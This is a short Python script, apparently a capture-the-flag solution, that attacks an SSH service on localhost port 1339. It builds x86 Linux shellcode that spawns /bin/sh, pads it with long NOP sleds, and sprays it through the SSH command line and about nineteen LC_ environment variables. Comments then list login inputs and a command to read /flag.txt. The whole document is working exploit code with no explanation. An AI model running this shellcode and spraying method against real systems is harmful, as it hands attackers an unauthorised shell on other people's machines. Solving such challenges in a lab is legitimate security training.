import subprocess

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

subprocess.run(b"ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=accept-new -o SendEnv=LC_* -o GlobalKnownHostsFile=/dev/null -o UserKnownHostsFile=/dev/null -p 1339 wolfsheim@localhost "+shellcode.rjust(130000, b'\x90'), shell=True, env={b"LC_"+shellcode.rjust(50000+i, b'\x90'): shellcode.rjust(50000, b'\x90') for i in range(19)})

# enter:
# gonnegtions
# 4290562344
# cat /flag.txt
